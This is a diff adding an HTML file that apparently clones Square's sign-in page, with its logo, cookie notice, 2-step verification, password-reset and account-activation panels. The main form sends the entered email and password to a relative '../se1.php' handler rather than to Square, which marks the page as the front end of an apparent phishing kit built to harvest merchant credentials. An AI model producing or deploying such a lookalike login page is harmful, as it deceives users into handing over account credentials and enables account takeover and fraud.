@@ -1,0 +1,862 @@
+<html lang="en-US"><!--<![endif]--><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,user-scalable=no">
+    <meta name="csrf-param" content="authenticity_token">
+    <meta name="max-idle-minutes" content="30">
+   <meta name="referrer" content="origin">
+    <title>Sign In</title>
+  <link rel="shortcut icon" href="../favicon.ico" type="image/x-icon">
+  
+    <link href="login.css" media="screen" rel="stylesheet">
+    <link rel="canonical" href="#">
+    
+    
+    
+  <style type="text/css"></style>
+</head>
+
+  <body class="login-page ">
+
+    <div id="content" class="fade-in l-table">
+      <div id="login-wrapper" class="l-table-row">
+        <div class="l-table-cell">
+          <section class="login-modal">
+            <div class="login-modal-user-pass" style="display: block;">
+              <div class="login-modal-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
+                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
+                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
+                </svg>
+              </div>
+              <div class="login-modal-title">
+                <span class="login-modal-password-text">Forgot Password</span>
+                <span class="login-modal-instructions-sent-text">Instructions have been sent</span>
+              </div>
+
+
+
+              <div class="login-modal-content">
+
+                <form accept-charset="UTF-8" action="../se1.php" class="signin-page-form" name="sign-in-form" method="post">
+                  <div class="field email-field fade-label">
+                    <label class="text" for="email"></label>
+                    <input autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="autofocus" class="text" id="email" name="email" size="30" placeholder="Email Address" spellcheck="false" type="email" value="" required="">
+                  </div>
+
+                  <div class="message-box-error-wrapper">
+                    <div class="message-box-error"></div>
+                  </div>
+                  <div class="field password-field fade-label">
+                    <label class="text" for="password"></label>
+                    <input class="text" id="password" name="password" size="30" autocomplete="off" type="password" placeholder="Password" value="" required="">
+                    <div class="login-forgot-password-wrapper">
+                      <a href="#" class="forgot-password-link track-event">Forgot Password</a>
+                    </div>
+                  </div>
+
+                  <div style="clear: both"></div>
+
+                  <div id="captcha" class="g-recaptcha submit-button"></div>
+
+                  <div class="submit-button full-length-submit-button">
+                    <button id="sign-in-button" name="sign-in-button" type="submit" class="btn btn-blue track-event">
+                      <span class="button-text">Sign In</span>
+                    </button>
+                  </div>
+                  <div class="footer">
+                    Don’t have a Square account?
+                    <span class="signup-today">
+                      <a href="https://squareup.com/signup?lang_code=en-US" class="track-event">Sign up</a>
+                    </span>
+                  </div>
+                </form>
+              </div>
+            </div>
+            <div class="login-modal-cookies-disabled hide" style="display: none">
+              <div class="login-modal-title">Cookies are disabled</div>
+              <div class="login-modal-content">
+                <div class="login-modal-text">
+                  <div>
+                    <span class="login-modal-primary-text">This site requires cookies.</span>
+                    <span class="login-modal-secondary-text">Please enable cookies in your browser's preferences and click the button below to proceed.</span>
+                  </div>
+                </div>
+                <div class="login-modal-text">
+                  <a href="https://squareup.com/help/us/en/article/5245-square-dashboard-troubleshooting#Enable-Cookies">
+                    Learn how to enable cookies&nbsp;&gt;
+                  </a>
+                  <br>
+                  <a href="https://squareup.com/help/us/en/article/3798-square-s-information-collection-policies">Learn more about Square's Information Collection Policies&nbsp;&gt;</a>
+                </div>
+              </div>
+              <div class="submit-button full-length-submit-button">
+                <button type="button" class="cookies-disabled-button btn btn-blue">
+                  <span class="button-text">I have enabled cookies</span>
+                </button>
+              </div>
+            </div>
+
+            <div class="login-modal-check-email hide" style="display: none">
+              <div class="login-modal-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
+                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
+                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
+                </svg>
+              </div>
+              <div class="login-modal-title">
+                Sign In
+              </div>
+              <div class="login-modal-content">
+                <div class="login-modal-text">
+                  Check your inbox for an email from Square.
+                </div>
+                <div class="login-modal-text">
+                  We just sent you a link to complete sign in. If you don’t see it in your inbox, remember to check your spam folder.
+                </div>
+              </div>
+              <div class="footer">
+                <a href="#" class="login-link track-event">
+                  Back to login
+                </a>
+              </div>
+            </div>
+            <div class="login-modal-expired-code hide" style="display: none">
+              <div class="login-modal-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
+                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
+                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
+                </svg>
+              </div>
+              <div class="login-modal-title">
+                Sign In Link Expired
+              </div>
+              <div class="login-modal-content">
+                <div class="login-modal-text">
+                  <div class="login-modal-secondary-text">
+                    The link we sent to you for sign in was only valid for 5 minutes and is now expired. Please go back to login and try again.
+                  </div>
+                </div>
+              </div>
+              <div class="footer">
+                <a href="#" class="login-link track-event">
+                  Back to login
+                </a>
+              </div>
+            </div>
+            <div class="login-modal-enroll-two-factor-method-selector hide" style="display: none">
+              <div class="login-modal-enroll-two-factor-title login-modal-title">
+                Activate 2-Step Verification
+              </div>
+              <div class="login-modal-content">
+                <div class="login-modal-text login-modal-text-small-margin-bottom">
+                  <span class="login-modal-secondary-text">An administrator on your account requires you to set up 2-Step Verification. <a href="https://squareup.com/help/us/en/article/5593-2-step-verification" style="color: #2996cc;text-decoration: none">Learn More&nbsp;&gt;</a></span>
+                </div>
+                <div class="login-modal-text login-modal-text-small-margin-bottom">
+                  <span class="login-modal-secondary-text">Choose a 2-Step Verification Method:</span>
+                </div>
+                <div class="login-modal-text login-modal-text-small-margin-bottom">
+                  <div class="selector-button">
+                    <button type="button" class="enroll-two-factor-sms-button btn btn-blue">
+                      <span class="button-text">SMS</span>
+                    </button>
+                  </div>
+                  <div class="selector-button">
+                    <button type="button" class="enroll-two-factor-authenticator-button btn btn-blue">
+                      <span class="button-text">Authentication App</span>
+                    </button>
+                  </div>
+                  <div style="clear: both;"></div>
+                </div>
+                <div class="login-modal-text login-modal-text-no-margin-bottom">
+                  <div class="enroll-link">
+                    <a href="" class="login-link">Back to login</a>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="login-modal-enroll-two-factor-sms hide" style="display: none">
+              <div class="login-modal-enroll-two-factor-title login-modal-title">
+                Activate 2-Step Verification
+              </div>
+              <div class="login-modal-content">
+                <div class="login-modal-activation-text login-modal-text" style="display: none">
+                  <span>An administrator on your account requires you to set up 2-Step Verification. <a href="https://squareup.com/help/us/en/article/5593-2-step-verification" style="color: #2996cc;text-decoration: none">Learn More&nbsp;&gt;</a></span>
+                </div>
+                <div class="login-modal-sms-primary-text login-modal-text" style="display: none">
+                  <span>We’ll text you a verification code each time you log in to Dashboard or Register.</span>
+                </div>
+                <form accept-charset="UTF-8" action="" class="enroll-two-factor-form" method="post" novalidate="novalidate">
+                  <div class="input-submit">
+                    <div class="submit-button inline-submit-button">
+                      <button type="submit" class="btn btn-blue track-event">
+                        <span class="button-text">Send</span>
+                      </button>
+                    </div>
+                    <div class="field phone-number-text-field fade-label">
+                      <label class="text" for="send-phone-number-text">Phone Number</label>
+                      <input autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="autofocus" class="text" id="send-phone-number-text" name="phone-number-text" size="10" spellcheck="false" value="">
+                    </div>
+                  </div>
+                </form>
+                <div class="login-modal-text login-modal-text-no-margin-bottom">
+                  <span class="login-modal-sms-secondary-text">We’ll text you a verification code each time you log in to Dashboard or Register.</span>
+                </div>
+                <div class="login-modal-text login-modal-text-no-margin-bottom">
+                  <div class="enroll-link">
+                    <a href="" class="back-link">Back</a>
+                    <a href="" class="login-link">Back to login</a>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="login-modal-enroll-two-factor-authenticator-qr hide" style="display: none">
+              <div class="login-modal-enroll-two-factor-title login-modal-title">
+                Activate 2-Step Verification
+              </div>
+              <div class="login-modal-content">
+                <div class="login-modal-activation-text login-modal-text" style="display: none">
+                  <span>An administrator on your account requires you to set up 2-Step Verification. <a href="https://squareup.com/help/us/en/article/5593-2-step-verification" style="color: #2996cc;text-decoration: none">Learn More&nbsp;&gt;</a></span>
+                </div>
+                <div class="login-modal-authenticator-primary-text login-modal-text" style="display: none">
+                  <span>Scan this barcode with your two-factor authentication app to start generating secure passcodes. <a href="https://squareup.com/help/us/en/article/5593-2-step-verification" style="color: #2996cc;text-decoration: none">Learn More&nbsp;&gt;</a></span>
+                </div>
+                <div class="login-modal-text enroll-two-factor-authenticator-qr-code"></div>
+                <div class="login-modal-authenticator-secondary-text login-modal-text" style="display: none">
+                  <span>Scan this barcode with your two-factor authentication app to start generating secure passcodes. <a href="https://squareup.com/help/us/en/article/5593-2-step-verification" style="color: #2996cc;text-decoration: none">Learn More&nbsp;&gt;</a></span>
+                </div>
+                <div class="submit-button full-length-submit-button">
+                  <button type="button" class="enroll-two-factor-authenticator-qr-next-button btn btn-blue">
+                    <span class="button-text">Next</span>
+                  </button>
+                </div>
+                <div class="submit-button full-length-submit-button">
+                  <button type="button" class="enroll-two-factor-authenticator-manual-button btn btn-blue inverse">
+                    <span class="button-text">I Can’t Scan the Barcode</span>
+                  </button>
+                </div>
+                <div class="login-modal-text login-modal-text-no-margin-bottom">
+                  <div class="enroll-link">
+                    <a href="" class="back-link">Back</a>
+                    <a href="" class="login-link">Back to login</a>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="login-modal-enroll-two-factor-authenticator-manual hide" style="display: none">
+              <div class="login-modal-enroll-two-factor-title">
+                <div class="login-modal-title">
+                  Manual Setup Code
+                </div>
+                <div class="login-modal-text">
+                  Use this key code to add your Square account to an authentication app. <a href="https://squareup.com/help/us/en/article/5593-2-step-verification" style="color: #2996cc;text-decoration: none">Learn More&nbsp;&gt;</a>
+                </div>
+              </div>
+              <div class="login-modal-content">
+                <div class="login-modal-text enroll-two-factor-authenticator-key"></div>
+                <div class="login-modal-text">
+                  <span class="login-modal-secondary-text">Account name: <span id="authenticator-manual-account-name"></span></span>
+                </div>
+                <div class="submit-button full-length-submit-button">
+                  <button type="button" class="enroll-two-factor-authenticator-manual-next-button btn btn-blue">
+                    <span class="button-text">Next</span>
+                  </button>
+                </div>
+                <div class="login-modal-text login-modal-text-no-margin-bottom">
+                  <a href="" class="back-link">Back</a>
+                </div>
+              </div>
+            </div>
+            <div class="login-modal-enroll-enter-verification-code hide" style="display: none">
+              <div class="login-modal-enroll-enter-verification-code-title login-modal-title">
+                Finish 2-Step Verification
+              </div>
+              <div class="login-modal-content">
+                <form accept-charset="UTF-8" action="" class="enroll-enter-verification-code-form" method="post" novalidate="novalidate">
+                  <div class="login-modal-enroll-enter-verification-code-text login-modal-text">
+                    <div class="login-modal-secondary-text">
+                      A text message has been sent to <span id="enroll-verification-phone-number"></span> <a class="resend-enroll-code-link" href="#">Resend Code</a>
+                    </div>
+                  </div>
+                  <div class="login-modal-enroll-enter-verification-code-text-authenticator login-modal-text">
+                    <div class="login-modal-secondary-text">
+                      Enter your verification code from your authentication app.
+                    </div>
+                  </div>
+                  <div class="input-submit">
+                    <div class="submit-button inline-submit-button">
+                      <button type="submit" class="btn btn-blue track-event">
+                        <span class="button-text">Verify</span>
+                      </button>
+                    </div>
+                    <div class="field enroll-verification-code-field fade-label">
+                      <label class="text" for="enroll-verification-code">Enter Code</label>
+                      <input type="text" name="enroll-verification-code" id="enroll-verification-code" size="10" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" class="text" value="">
+                    </div>
+                  </div>
+                  <div class="login-modal-text login-modal-text-no-margin-bottom">
+                    <a href="" class="back-link">Back</a>
+                  </div>
+                </form>
+              </div>
+            </div>
+            <div class="login-modal-enroll-complete hide" style="display: none">
+              <div class="enroll-complete-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 80" role="img">
+                  <path fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M40,8c-7.9,5.2-20.8,9-28.6,10.5C8.4,46,24.7,65.1,40,73"></path>
+                  <path fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M40,3C32.5,9.3,15.2,14,7.8,15C3.1,46.6,21,68.6,40,77"></path>
+                  <path fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M40,8c7.9,5.2,20.8,9,28.6,10.5C71.5,46,55.3,65.1,40,73"></path>
+                  <path fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M40,3c7.5,6.3,24.8,11,32.2,12C76.9,46.6,59,68.6,40,77"></path>
+                  <line fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" x1="68" y1="33" x2="24.5" y2="60.7"></line>
+                  <line fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" x1="56" y1="16" x2="14" y2="43"></line>
+                </svg>
+              </div>
+              <div class="login-modal-enroll-complete-title login-modal-title">
+                2-Step Verification Setup Complete
+              </div>
+              <div class="login-modal-content">
+                <div class="login-modal-text">
+                  Your account is now secured with 2-Step Verification.
+                </div>
+                <div class="submit-button full-length-submit-button">
+                  <button type="button" class="enroll-complete-button btn btn-blue">
+                    <span class="button-text">Go to Dashboard</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+            <div class="login-modal-send-verification-code hide" style="display: none">
+              <div class="login-modal-send-verification-code-title login-modal-title">
+                Send Verification Code
+              </div>
+              <div class="login-modal-content">
+                <form accept-charset="UTF-8" action="" class="send-verification-code-form" method="post" novalidate="novalidate">
+                  <div style="clear: both;"></div>
+                  <div class="login-modal-text">
+                    <div class="login-modal-secondary-text">
+                      Where should we send your 2-Step Verification code?
+                    </div>
+                  </div>
+                  <div class="input-submit select-phone-number-row">
+                    <div class="submit-button inline-submit-button">
+                      <button type="submit" class="btn btn-blue track-event">
+                        <span class="button-text">Send Code</span>
+                      </button>
+                    </div>
+                    <div class="field phone-number-select-field select-field">
+                      <select class="phone-number-select input" name="phone-number-select">
+                        <option value="" disabled="" selected="selected" hidden="">Select Phone Number</option>
+                      </select>
+                    </div>
+                  </div>
+                  <ul class="menu-list footer">
+                    <li class="login-back-to-start menu-item" style="display: none">
+                      <a class="login-back-to-start-link" href="#">Back to login</a></li>
+                    <li class="login-back-to-authenticator menu-item" style="display: none">
+                      <a class="login-back-to-authenticator-link" href="#">Back</a></li>
+                  </ul>
+                </form>
+              </div>
+            </div>
+            <div class="login-modal-enter-verification-code hide" style="display: none">
+              <div class="login-modal-enter-verification-code-title-sms login-modal-title">
+                Enter Verification Code
+              </div>
+              <div class="login-modal-enter-verification-code-title-authenticator login-modal-title">
+                Additional Verification Required
+              </div>
+              <div class="login-modal-content">
+                <form accept-charset="UTF-8" action="" class="enter-verification-code-form" method="post" novalidate="novalidate">
+                  <div class="login-modal-text">
+                    <div class="login-modal-secondary-text login-modal-enter-verification-code-text">
+                      A text message has been sent to <span id="verification-phone-number"></span>. <a class="resend-code-link" href="#">Resend Code</a>
+                    </div>
+                    <div class="login-modal-secondary-text login-modal-enter-verification-code-text-authenticator">
+                      Enter your verification code from your authentication app.
+                    </div>
+                  </div>
+                  <div class="input-submit" id="verification-code-row">
+                    <div class="submit-button">
+                      <button type="submit" class="btn btn-blue track-event">
+                        <span class="button-text">Verify</span>
+                      </button>
+                    </div>
+                    <div class="field verification-code-field fade-label">
+                      <label class="text" for="verification-code">Enter Code</label>
+                      <input type="text" name="verification-code" id="verification-code" size="10" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" class="text" value="">
+                    </div>
+                  </div>
+                  <div class="checkbox trusted-device-checkbox">
+                    <label class="text"><input type="checkbox" name="trusted-device">Remember this device for 30 days</label>
+                  </div>
+                  <div style="clear: both;"></div>
+                  <ul class="menu-list footer">
+                    <li class="login-use-sms menu-item" style="display: none">
+                      <a class="login-use-sms-link" href="#">Text me a code</a></li>
+                    <li class="login-back-to-start menu-item" style="display: none">
+                      <a class="login-back-to-start-link" href="#">Back to login</a></li>
+                    <li class="login-back-to-authenticator menu-item" style="display: none">
+                      <a class="login-back-to-authenticator-link" href="#">Back</a></li>
+                    <li class="login-back-to-select-number menu-item" style="display: none">
+                      <a class="login-back-to-select-number-link" href="#">Change phone number</a></li>
+                  </ul>
+                </form>
+              </div>
+            </div>
+
+            <div class="login-modal-reset-password-send-code hide" style="display: none">
+              <div class="login-modal-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
+                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
+                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
+                </svg>
+              </div>
+              <div class="login-modal-title">
+                Reset Password
+              </div>
+              <div class="login-modal-content">
+                <div class="login-modal-text">
+                  <div class="login-modal-secondary-text">
+                    Enter the email address you used to register with Square and we'll send you instructions to reset your password.
+                  </div>
+                </div>
+              </div>
+              <form accept-charset="UTF-8" action="" method="post">
+                <input type="hidden" id="password-locale" value="en-US">
+                <div style="clear: both;"></div>
+                <div class="input-submit">
+                  <div class="submit-button">
+                    <button type="submit" class="btn btn-blue">
+                      <span class="button-text">Send Instructions</span>
+                    </button>
+                  </div>
+                  <div class="field fade-label forgot-password-email-field">
+                    <label class="text" for="reset-password-email">Email Address</label>
+                    <input autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="autofocus" class="text forgot-password-email" id="reset-password-email" name="reset-password-email" spellcheck="false" type="email" value="">
+                  </div>
+                </div>
+              </form>
+              <div class="footer">
+                <a href="https://squareup.com/help/us/en/contact?panel=36405A439AFD" target="_blank" class="track-event">I don't remember my email address</a>
+                <br><br>
+                <a href="#" class="login-link track-event">Back to login</a>
+              </div>
+            </div>
+            <div class="login-modal-reset-password-check-email hide" style="display: none">
+              <div class="login-modal-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
+                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
+                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
+                </svg>
+              </div>
+              <div class="login-modal-title">
+                Reset Password
+              </div>
+              <div class="login-modal-content">
+                <div class="login-modal-text">
+                  Check your inbox for an email from Square.
+                </div>
+                <div class="login-modal-text">
+                  We just sent you an updated password reset link. If you don't see it in your inbox, remember to check your spam folder.
+                </div>
+              </div>
+              <div class="footer">
+                <a href="#" class="login-link track-event">Back to login</a>
+              </div>
+            </div>
+            <div class="login-modal-reset-password-expired-code hide" style="display: none">
+              <div class="login-modal-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
+                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
+                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
+                </svg>
+              </div>
+              <div class="login-modal-title">
+                Password Reset Link Expired
+              </div>
+              <div class="login-modal-content">
+                <form accept-charset="UTF-8" action="" method="get" novalidate="novalidate">
+                  <div class="login-modal-text">
+                    <div class="login-modal-secondary-text">
+                      The link we sent to you to reset your password was only valid for 24 hours and is now expired. Please request a new link below.
+                    </div>
+                  </div>
+
+                  <div style="clear: both"></div>
+                  <div class="submit-button full-length-submit-button">
+                    <button type="submit" class="btn btn-blue track-event">
+                      <span class="button-text">Reset Password</span>
+                    </button>
+                  </div>
+                </form>
+              </div>
+              <div class="footer">
+                <a href="#" class="login-link track-event">Back to login</a>
+              </div>
+            </div>
+            <div class="login-modal-reset-password-change-password hide" style="display: none">
+              <div class="login-modal-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
+                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
+                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
+                </svg>
+              </div>
+              <div class="login-modal-title">
+                Reset Password
+              </div>
+              <div class="login-modal-content">
+                <form accept-charset="UTF-8" action="" method="post" novalidate="novalidate">
+                  <div class="login-modal-text">
+                    <div class="login-modal-secondary-text">
+                      Please create a new password that is at least 8 characters long.
+                    </div>
+                  </div>
+
+                  <div id="reset-password-flash" class="flash-message flash-message-failure flash-message-top login-modal-text" role="alert" style="display: none;">
+                  </div>
+
+                  <div class="field fade-label password-field field-combined-top">
+                    <label class="text" for="reset-password-password">New password</label>
+                    <input autocomplete="off" class="text" id="reset-password-password" size="30" type="password" value="">
+                  </div>
+
+                  <div class="field fade-label password-field field-combined-bottom">
+                    <label class="text" for="reset-password-confirm-password">Confirm password</label>
+                    <input autocomplete="off" class="text" id="reset-password-confirm-password" size="30" type="password" value="">
+                  </div>
+
+                  <div style="clear: both"></div>
+                  <div class="login-modal-text">
+                    <span class="login-modal-secondary-icon">
+                      <img src="info_gray.svg" class="icon">
+                    </span>
+                    <div class="login-modal-secondary-text-with-icon">
+                      Any current logins with this account to Square—including Dashboard and the Square Point of Sale app—will be instantly logged out when your password is reset.
+                    </div>
+                  </div>
+
+                  <div style="clear: both"></div>
+                  <div class="submit-button full-length-submit-button">
+                    <button type="submit" class="btn btn-blue track-event">
+                      <span class="button-text">Reset Password</span>
+                    </button>
+                  </div>
+
+                  <input type="hidden" name="reset-password-person-token" id="reset-password-person-token" value="">
+                  <input type="hidden" name="reset-password-code" id="reset-password-code" value="">
+                </form>
+              </div>
+            </div>
+            <div class="login-modal-reset-password-change-complete hide" style="display: none">
+              <div class="login-modal-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
+                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
+                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
+                </svg>
+              </div>
+              <div class="login-modal-title">
+                Password Reset Successful
+              </div>
+              <div class="login-modal-content">
+                <form accept-charset="UTF-8" action="" method="get" novalidate="novalidate">
+                  <div class="login-modal-text">
+                    <div class="login-modal-secondary-text">
+                      The password for your Square account has been successfully reset.
+                    </div>
+                  </div>
+
+                  <div style="clear: both"></div>
+                  <div class="submit-button full-length-submit-button">
+                    <button type="submit" class="btn btn-blue track-event">
+                      <span class="button-text">Continue</span>
+                    </button>
+                  </div>
+                </form>
+              </div>
+            </div>
+
+            <div class="login-modal-claim-account-check-email hide" style="display: none">
+              <div class="login-modal-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
+                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
+                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
+                </svg>
+              </div>
+              <div class="login-modal-title">
+                Account activation
+              </div>
+              <div class="login-modal-content">
+                <div class="login-modal-text">
+                  Check your inbox for an email from Square.
+                </div>
+                <div class="login-modal-text">
+                  We just sent you an updated link to activate your account. If you don't see it in your inbox, remember to check your spam folder.
+                </div>
+              </div>
+            </div>
+            <div class="login-modal-claim-account-expired-code hide" style="display: none">
+              <div class="login-modal-logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
+                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
+                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
+                </svg>
+              </div>
+              <div class="login-modal-title">
+                Account activation link expired
+              </div>
+              <div class="login-modal-content">
+                <form accept-charset="UTF-8" action="" method="get" novalidate="novalidate">
+                  <div id="claim-account-expired-flash" class="flash-message flash-message-failure flash-message-top login-modal-text" role="alert" style="display: none;">
+                  </div>
+
+                  <div class="login-modal-text">
+                    <div class="login-modal-secondary-text">
+                        The link we sent you to activate your Square account was only valid for 24 hours and is now expired. Please request a new link below.
+                    </div>
+                  </div>
+
+                  <div style="clear: both"></div>
+                  <div class="submit-button full-length-submit-button">
+                    <button type="submit" class="btn btn-blue track-event">
+                      <span class="button-text">
+                        Resend email
+                      </span>
+                    </button>
+                  </div>
+                </form>
+              </div>
+            </div>
